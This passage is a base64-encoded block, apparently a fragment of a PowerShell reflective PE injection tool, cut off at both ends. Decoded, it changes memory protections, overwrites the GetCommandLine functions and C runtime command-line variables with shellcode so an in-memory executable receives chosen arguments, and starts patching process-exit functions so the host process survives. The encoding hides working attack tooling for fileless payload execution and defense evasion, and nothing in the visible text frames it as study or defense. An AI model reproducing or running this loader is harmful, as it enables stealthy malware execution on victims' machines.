ZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKCQkJCXsKCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURQoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRAoJCQkJfQoJCQl9CgkJCWVsc2UKCQkJewoJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9XUklURUNPUFkKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFCgkJCQl9CgkJCX0KCQl9CgkJZWxzZQoJCXsKCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9SRUFEKSAtZ3QgMCkKCQkJewoJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRE9OTFkKCQkJCX0KCQkJfQoJCQllbHNlCgkJCXsKCQkJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX1dSSVRFQ09QWQoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQUNDRVNTCgkJCQl9CgkJCX0KCQl9CgkJCgkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEKSAtZ3QgMCkKCQl7CgkJCSRQcm90ZWN0aW9uRmxhZyA9ICRQcm90ZWN0aW9uRmxhZyAtYm9yICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQ0FDSEUKCQl9CgkJCgkJcmV0dXJuICRQcm90ZWN0aW9uRmxhZwoJfQoKCUZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlQcm90ZWN0aW9uRmxhZ3MKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRQRUluZm8sCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJGdW5jdGlvbnMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJDb25zdGFudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcwoJCSkKCQkKCQlmb3IoICRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspCgkJewoJCQlbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlNlY3Rpb25IZWFkZXJQdHIpICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikpKQoJCQkkU2VjdGlvbkhlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRTZWN0aW9uSGVhZGVyUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikKCQkJW0ludFB0cl0kU2VjdGlvblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFNlY3Rpb25IZWFkZXIuVmlydHVhbEFkZHJlc3MpCgkJCQoJCQlbVUludDMyXSRQcm90ZWN0RmxhZyA9IEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlICRTZWN0aW9uSGVhZGVyLkNoYXJhY3RlcmlzdGljcwoJCQlbVUludDMyXSRTZWN0aW9uU2l6ZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCgkJCQoJCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKCQkJVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFnczo6VmlydHVhbFByb3RlY3QiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uUHRyIC1TaXplICRTZWN0aW9uU2l6ZSB8IE91dC1OdWxsCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkU2VjdGlvblB0ciwgJFNlY3Rpb25TaXplLCAkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQkJewoJCQkJVGhyb3cgIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHByb3RlY3Rpb24iCgkJCX0KCQl9Cgl9CgkKCSNUaGlzIGZ1bmN0aW9uIG92ZXJ3cml0ZXMgR2V0Q29tbWFuZExpbmUgYW5kIEV4aXRUaHJlYWQgd2hpY2ggYXJlIG5lZWRlZCB0byByZWZsZWN0aXZlbHkgbG9hZCBhbiBFWEUKCSNSZXR1cm5zIGFuIG9iamVjdCB3aXRoIGFkZHJlc3NlcyB0byBjb3BpZXMgb2YgdGhlIGJ5dGVzIHRoYXQgd2VyZSBvdmVyd3JpdHRlbiAoYW5kIHRoZSBjb3VudCkKCUZ1bmN0aW9uIFVwZGF0ZS1FeGVGdW5jdGlvbnMKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRQRUluZm8sCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJGdW5jdGlvbnMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJDb25zdGFudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRFeGVBcmd1bWVudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50UHRyXQoJCSRFeGVEb25lQnl0ZVB0cgoJCSkKCQkKCQkjVGhpcyB3aWxsIGJlIGFuIGFycmF5IG9mIGFycmF5cy4gVGhlIGlubmVyIGFycmF5IHdpbGwgY29uc2lzdCBvZjogQCgkRGVzdEFkZHIsICRTb3VyY2VBZGRyLCAkQnl0ZUNvdW50KS4gVGhpcyBpcyB1c2VkIHRvIHJldHVybiBtZW1vcnkgdG8gaXRzIG9yaWdpbmFsIHN0YXRlLgoJCSRSZXR1cm5BcnJheSA9IEAoKSAKCQkKCQkkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKCQkKCQlbSW50UHRyXSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJLZXJuZWwzMi5kbGwiKQoJCWlmICgkS2VybmVsMzJIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJdGhyb3cgIktlcm5lbDMyIGhhbmRsZSBudWxsIgoJCX0KCQkKCQlbSW50UHRyXSRLZXJuZWxCYXNlSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIktlcm5lbEJhc2UuZGxsIikKCQlpZiAoJEtlcm5lbEJhc2VIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJdGhyb3cgIktlcm5lbEJhc2UgaGFuZGxlIG51bGwiCgkJfQoKCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJI0ZpcnN0IG92ZXJ3cml0ZSB0aGUgR2V0Q29tbWFuZExpbmUoKSBmdW5jdGlvbi4gVGhpcyBpcyB0aGUgZnVuY3Rpb24gdGhhdCBpcyBjYWxsZWQgYnkgYSBuZXcgcHJvY2VzcyB0byBnZXQgdGhlIGNvbW1hbmQgbGluZSBhcmdzIHVzZWQgdG8gc3RhcnQgaXQuCgkJIwlXZSBvdmVyd3JpdGUgaXQgd2l0aCBzaGVsbGNvZGUgdG8gcmV0dXJuIGEgcG9pbnRlciB0byB0aGUgc3RyaW5nIEV4ZUFyZ3VtZW50cywgYWxsb3dpbmcgdXMgdG8gcGFzcyB0aGUgZXhlIGFueSBhcmdzIHdlIHdhbnQuCgkJJENtZExpbmVXQXJnc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbFVuaSgkRXhlQXJndW1lbnRzKQoJCSRDbWRMaW5lQUFyZ3NQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRFeGVBcmd1bWVudHMpCgkKCQlbSW50UHRyXSRHZXRDb21tYW5kTGluZUFBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsQmFzZUhhbmRsZSwgIkdldENvbW1hbmRMaW5lQSIpCgkJW0ludFB0cl0kR2V0Q29tbWFuZExpbmVXQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbEJhc2VIYW5kbGUsICJHZXRDb21tYW5kTGluZVciKQoKCQlpZiAoJEdldENvbW1hbmRMaW5lQUFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvIC1vciAkR2V0Q29tbWFuZExpbmVXQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQl0aHJvdyAiR2V0Q29tbWFuZExpbmUgcHRyIG51bGwuIEdldENvbW1hbmRMaW5lQTogJChHZXQtSGV4ICRHZXRDb21tYW5kTGluZUFBZGRyKS4gR2V0Q29tbWFuZExpbmVXOiAkKEdldC1IZXggJEdldENvbW1hbmRMaW5lV0FkZHIpIgoJCX0KCgkJI1ByZXBhcmUgdGhlIHNoZWxsY29kZQoJCVtCeXRlW11dJFNoZWxsY29kZTEgPSBAKCkKCQlpZiAoJFB0clNpemUgLWVxIDgpCgkJewoJCQkkU2hlbGxjb2RlMSArPSAweDQ4CSM2NGJpdCBzaGVsbGNvZGUgaGFzIHRoZSAweDQ4IGJlZm9yZSB0aGUgMHhiOAoJCX0KCQkkU2hlbGxjb2RlMSArPSAweGI4CgkJCgkJW0J5dGVbXV0kU2hlbGxjb2RlMiA9IEAoMHhjMykKCQkkVG90YWxTaXplID0gJFNoZWxsY29kZTEuTGVuZ3RoICsgJFB0clNpemUgKyAkU2hlbGxjb2RlMi5MZW5ndGgKCQkKCQkKCQkjTWFrZSBjb3B5IG9mIEdldENvbW1hbmRMaW5lQSBhbmQgR2V0Q29tbWFuZExpbmVXCgkJJEdldENvbW1hbmRMaW5lQU9yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQoJCSRHZXRDb21tYW5kTGluZVdPcmlnQnl0ZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRvdGFsU2l6ZSkKCQkkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyLCAkR2V0Q29tbWFuZExp",
		"bmVBQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCgkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEdldENvbW1hbmRMaW5lV09yaWdCeXRlc1B0ciwgJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50NjRdJFRvdGFsU2l6ZSkgfCBPdXQtTnVsbAoJCSRSZXR1cm5BcnJheSArPSAsKCRHZXRDb21tYW5kTGluZUFBZGRyLCAkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQoJCSRSZXR1cm5BcnJheSArPSAsKCRHZXRDb21tYW5kTGluZVdBZGRyLCAkR2V0Q29tbWFuZExpbmVXT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQoKCQkjT3ZlcndyaXRlIEdldENvbW1hbmRMaW5lQQoJCVtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAoJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVBQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCWlmICgkU3VjY2VzcyA9ICRmYWxzZSkKCQl7CgkJCXRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQl9CgkJCgkJJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wID0gJEdldENvbW1hbmRMaW5lQUFkZHIKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMSAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAKCQkkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgKCRTaGVsbGNvZGUxLkxlbmd0aCkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ21kTGluZUFBcmdzUHRyLCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAsICRmYWxzZSkKCQkkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgJFB0clNpemUKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMiAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAKCQkKCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAoJCQoJCQoJCSNPdmVyd3JpdGUgR2V0Q29tbWFuZExpbmVXCgkJW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCgkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZVdBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCgkJaWYgKCRTdWNjZXNzID0gJGZhbHNlKQoJCXsKCQkJdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgoJCX0KCQkKCQkkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgPSAkR2V0Q29tbWFuZExpbmVXQWRkcgoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcAoJCSRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDbWRMaW5lV0FyZ3NQdHIsICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCwgJGZhbHNlKQoJCSRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCAkUHRyU2l6ZQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcAoJCQoJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCgkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQoJCQoJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkjRm9yIEMrKyBzdHVmZiB0aGF0IGlzIGNvbXBpbGVkIHdpdGggdmlzdWFsIHN0dWRpbyBhcyAibXVsdGl0aHJlYWRlZCBETEwiLCB0aGUgYWJvdmUgbWV0aG9kIG9mIG92ZXJ3cml0aW5nIEdldENvbW1hbmRMaW5lIGRvZXNuJ3Qgd29yay4KCQkjCUkgZG9uJ3Qga25vdyB3aHkgZXhhY3RseS4uIEJ1dCB0aGUgbXN2Y3IgRExMIHRoYXQgYSAiRExMIGNvbXBpbGVkIGV4ZWN1dGFibGUiIGltcG9ydHMgaGFzIGFuIGV4cG9ydCBjYWxsZWQgX2FjbWRsbiBhbmQgX3djbWRsbi4KCQkjCUl0IGFwcGVhcnMgdG8gY2FsbCBHZXRDb21tYW5kTGluZSBhbmQgc3RvcmUgdGhlIHJlc3VsdCBpbiB0aGlzIHZhci4gVGhlbiB3aGVuIHlvdSBjYWxsIF9fd2dldGNtZGxuIGl0IHBhcnNlcyBhbmQgcmV0dXJucyB0aGUKCQkjCWFyZ3YgYW5kIGFyZ2MgdmFsdWVzIHN0b3JlZCBpbiB0aGVzZSB2YXJpYWJsZXMuIFNvIHRoZSBlYXN5IHRoaW5nIHRvIGRvIGlzIGp1c3Qgb3ZlcndyaXRlIHRoZSB2YXJpYWJsZSBzaW5jZSB0aGV5IGFyZSBleHBvcnRlZC4KCQkkRGxsTGlzdCA9IEAoIm1zdmNyNzBkLmRsbCIsICJtc3ZjcjcxZC5kbGwiLCAibXN2Y3I4MGQuZGxsIiwgIm1zdmNyOTBkLmRsbCIsICJtc3ZjcjEwMGQuZGxsIiwgIm1zdmNyMTEwZC5kbGwiLCAibXN2Y3I3MC5kbGwiIGAKCQkJLCAibXN2Y3I3MS5kbGwiLCAibXN2Y3I4MC5kbGwiLCAibXN2Y3I5MC5kbGwiLCAibXN2Y3IxMDAuZGxsIiwgIm1zdmNyMTEwLmRsbCIpCgkJCgkJZm9yZWFjaCAoJERsbCBpbiAkRGxsTGlzdCkKCQl7CgkJCVtJbnRQdHJdJERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCREbGwpCgkJCWlmICgkRGxsSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJW0ludFB0cl0kV0NtZExuQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJERsbEhhbmRsZSwgIl93Y21kbG4iKQoJCQkJW0ludFB0cl0kQUNtZExuQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJERsbEhhbmRsZSwgIl9hY21kbG4iKQoJCQkJaWYgKCRXQ21kTG5BZGRyIC1lcSBbSW50UHRyXTo6WmVybyAtb3IgJEFDbWRMbkFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQkJewoJCQkJCSJFcnJvciwgY291bGRuJ3QgZmluZCBfd2NtZGxuIG9yIF9hY21kbG4iCgkJCQl9CgkJCQkKCQkJCSROZXdBQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRFeGVBcmd1bWVudHMpCgkJCQkkTmV3V0NtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCRFeGVBcmd1bWVudHMpCgkJCQkKCQkJCSNNYWtlIGEgY29weSBvZiB0aGUgb3JpZ2luYWwgY2hhciogYW5kIHdjaGFyX3QqIHNvIHRoZXNlIHZhcmlhYmxlcyBjYW4gYmUgcmV0dXJuZWQgYmFjayB0byB0aGVpciBvcmlnaW5hbCBzdGF0ZQoJCQkJJE9yaWdBQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkQUNtZExuQWRkciwgW1R5cGVdW0ludFB0cl0pCgkJCQkkT3JpZ1dDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRXQ21kTG5BZGRyLCBbVHlwZV1bSW50UHRyXSkKCQkJCSRPcmlnQUNtZExuUHRyU3RvcmFnZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKCQkJCSRPcmlnV0NtZExuUHRyU3RvcmFnZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRPcmlnQUNtZExuUHRyLCAkT3JpZ0FDbWRMblB0clN0b3JhZ2UsICRmYWxzZSkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRPcmlnV0NtZExuUHRyLCAkT3JpZ1dDbWRMblB0clN0b3JhZ2UsICRmYWxzZSkKCQkJCSRSZXR1cm5BcnJheSArPSAsKCRBQ21kTG5BZGRyLCAkT3JpZ0FDbWRMblB0clN0b3JhZ2UsICRQdHJTaXplKQoJCQkJJFJldHVybkFycmF5ICs9ICwoJFdDbWRMbkFkZHIsICRPcmlnV0NtZExuUHRyU3RvcmFnZSwgJFB0clNpemUpCgkJCQkKCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkQUNtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJCWlmICgkU3VjY2VzcyA9ICRmYWxzZSkKCQkJCXsKCQkJCQl0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCgkJCQl9CgkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3QUNtZExuUHRyLCAkQUNtZExuQWRkciwgJGZhbHNlKQoJCQkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkQUNtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJE9sZFByb3RlY3RGbGFnKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQkJCQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRXQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCQkJaWYgKCRTdWNjZXNzID0gJGZhbHNlKQoJCQkJewoJCQkJCXRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJCX0KCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCROZXdXQ21kTG5QdHIsICRXQ21kTG5BZGRyLCAkZmFsc2UpCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRXQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkT2xkUHJvdGVjdEZsYWcpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAoJCQl9CgkJfQoJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkKCQkKCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJI05leHQgb3ZlcndyaXRlIENvckV4aXRQcm9jZXNzIGFuZCBFeGl0UHJvY2VzcyB0byBpbnN0ZWFkIEV4aXRUaHJlYWQuIFRoaXMgd2F5IHRoZSBlbnRpcmUgUG93ZXJzaGVsbCBwcm9jZXNzIGRvZXNuJ3QgZGllIHdoZW4gdGhlIEVYRSBleGl0cy4KCgkJJFJldHVybkFycmF5ID0gQCgpCgkJJEV4aXRGdW5jdGlvbnMgPSBAKCkgI0FycmF5IG9mIGZ1bmN0aW9ucyB0byBvdmVyd3JpdGUgc28gdGhlIHRocmVhZCBkb2Vzbid0IGV4aXQgdGhlIHByb2Nlc3MKCQkKCQkjQ29yRXhpdFByb2Nlc3MgKGNvbXBpbGVkIGluIHRvIHZpc3VhbCBzdHVkaW8gYysrKQoJCVtJbnRQdHJdJE1zY29yZWVIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFu